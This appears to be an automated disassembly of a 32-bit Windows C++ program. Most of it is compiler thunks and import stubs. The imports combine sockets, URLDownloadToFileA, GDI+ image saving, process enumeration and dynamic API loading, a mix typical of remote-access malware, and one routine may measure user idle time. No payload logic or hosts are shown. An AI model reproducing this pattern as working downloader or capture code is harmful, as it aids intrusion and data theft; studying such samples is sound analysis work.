__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4073db
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4073e6
call sub_4073f0
jmp sub_407405
sub_4073f0
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
leave
retn
sub_407405
push ??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ
call sub_40fcba
pop ecx
retn
??1?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_40741c
call sub_407426
jmp sub_40743b
sub_407426
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40743b
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_407447
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_407447
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_408620
mov edx [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov eax [ ecx + 0xc ]
sub eax edx
sar eax 0x4
retn
xor eax eax
retn
sub_408637
mov eax [ ecx + 0x8 ]
retn
sub_409165
call sub_40916f
jmp sub_409184
sub_40916f
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_409184
push ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
call sub_40fcba
pop ecx
retn
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40919b
call sub_4091a5
jmp sub_4091ba
sub_4091a5
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4091ba
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4091c6
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4091c6
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4091d1
call sub_4091db
jmp sub_4091f0
sub_4091db
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_4091f0
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4091fc
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_4091fc
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_409207
call sub_409211
jmp sub_409226
sub_409211
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_409226
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_409232
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_409232
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40923d
call sub_409247
jmp sub_409254
sub_409247
push 0x0
mov ecx rw-data
call sub_4020e1
retn
sub_409254
push sub_409260
call sub_40fcba
pop ecx
retn
sub_409260
mov ecx rw-data
jmp sub_4021d6
sub_409e10
call sub_409e1a
jmp sub_409e27
sub_409e1a
push 0x0
mov ecx rw-data
call sub_4020e1
retn
sub_409e27
push sub_409e33
call sub_40fcba
pop ecx
retn
sub_409e33
mov ecx rw-data
jmp sub_4021d6
sub_409e3d
call sub_409e47
jmp sub_409e5c
sub_409e47
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_409e5c
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_409e68
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_409e68
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40ce9d
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
call sub_408637
push eax
mov ecx esi
call sub_40ceb8
pop esi
pop ebp
retn 0x4
sub_40d0b5
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40d125
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40d0c8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d140
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40d161
call sub_40d16b
jmp sub_40d178
sub_40d16b
push 0x0
mov ecx rw-data
call sub_4020e1
retn
sub_40d178
push sub_40d184
call sub_40fcba
pop ecx
retn
sub_40d184
mov ecx rw-data
jmp sub_4021d6
sub_40d627
mov eax r-xdata
retn
sub_40d62d
call __imp_??0Init@ios_base@std@@QAE@XZ
jmp sub_40d642
__imp_??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_40d642
push __imp_??1Init@ios_base@std@@QAE@XZ
call sub_40fcba
pop ecx
retn
__imp_??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_40d659
call __imp_??0_Winit@std@@QAE@XZ
jmp sub_40d66e
__imp_??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_40d66e
push __imp_??1_Winit@std@@QAE@XZ
call sub_40fcba
pop ecx
retn
__imp_??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_40d685
call sub_40d68f
jmp sub_40d69c
sub_40d68f
push 0x0
mov ecx rw-data
call sub_4020e1
retn
sub_40d69c
push sub_40d6a8
call sub_40fcba
pop ecx
retn
sub_40d6a8
mov ecx rw-data
jmp sub_4021d6
sub_40d6b2
call sub_40d6bc
jmp sub_40d6d1
sub_40d6bc
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40d6d1
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40d6dd
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40d6dd
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40d6e8
call sub_40d6f2
jmp sub_40d707
sub_40d6f2
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40d707
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40d713
call sub_40fcba
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40d713
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40da32
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call GdipGetImageEncodersSize
pop ebp
retn
sub_40da42
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call GdipGetImageEncoders
pop ebp
retn
sub_40dd21
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
pop ebp
retn 0xc
sub_40dd94
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call GdipFree
pop ebp
retn
sub_40dda1
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call GdipDisposeImage
retn
sub_40ddef
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call GdipAlloc
pop ebp
retn
sub_40ddfc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ecx + 0x8 ] eax
jmp r-xdata
pop ebp
retn 0x4
sub_40de56
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_40e403
push 0x3e8
call [ Sleep@IAT ]
mov eax r-xdata
retn
sub_40e4ab
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40f234
neg eax
sbb eax eax
pop ecx
neg eax
retn
j_sub_40e4c9
jmp sub_40e4c9
sub_40e4c9
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_40e898
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x8
push eax
call [ rw-data ]
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x4 ]
leave
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40ecd2
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40f637
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
call sub_408637
push eax
mov ecx esi
call sub_40f652
pop esi
pop ebp
retn 0x4
sub_40f845
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_40f85a
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_40f85a
push ??1Init@ios_base@std@@QAE@XZ
call sub_40fcba
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_40f871
call ??0_Winit@std@@QAE@XZ
jmp sub_40f886
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_40f886
push ??1_Winit@std@@QAE@XZ
call sub_40fcba
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
j_sub_40f8a2
jmp sub_40f8a2
sub_40f8a2
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
??0logic_error@std@@QAE@ABV01@@Z
jmp [ std::logic_error::logic_error@IAT ]
??0out_of_range@std@@QAE@ABV01@@Z
jmp [ std::out_of_range::out_of_range@IAT ]
??1out_of_range@std@@UAE@XZ
jmp [ std::out_of_range::~out_of_range@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
jmp [ std::operator&@IAT ]
sub_40fc2c
push [ esp + 0x4 ]
call free
pop ecx
retn
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@G@Z
jmp [ std::operator&@IAT ]
??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
jmp [ std::operator<<@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@DABV10@@Z
jmp [ std::operator&@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
??0exception@@QAE@ABV0@@Z
jmp [ exception::exception@IAT ]
sub_40fc6c
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40fc2c
pop ecx
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
sub_40fc8e
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40fcba
push [ esp + 0x4 ]
call sub_40fc8e
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_ftol
jmp [ _ftol@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
free
jmp [ free@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40fefe
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40ff10
xor eax eax
retn
sub_40ff13
retn
_controlfp
jmp [ _controlfp@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
connect
jmp [ connect@IAT ]
recv
jmp [ recv@IAT ]
send
jmp [ send@IAT ]
htons
jmp [ htons@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GdipLoadImageFromStream
jmp [ GdipLoadImageFromStream@IAT ]
GdipLoadImageFromStreamICM
jmp [ GdipLoadImageFromStreamICM@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipSaveImageToFile
jmp [ GdipSaveImageToFile@IAT ]
sub_40ffa0
mov eax r--data
jmp __CxxFrameHandler
sub_40ffac
mov eax r--data
jmp __CxxFrameHandler
sub_40ffb8
mov eax r--data
jmp __CxxFrameHandler
sub_40ffc4
mov eax r--data
jmp __CxxFrameHandler
sub_40ffd0
mov eax r--data
jmp __CxxFrameHandler
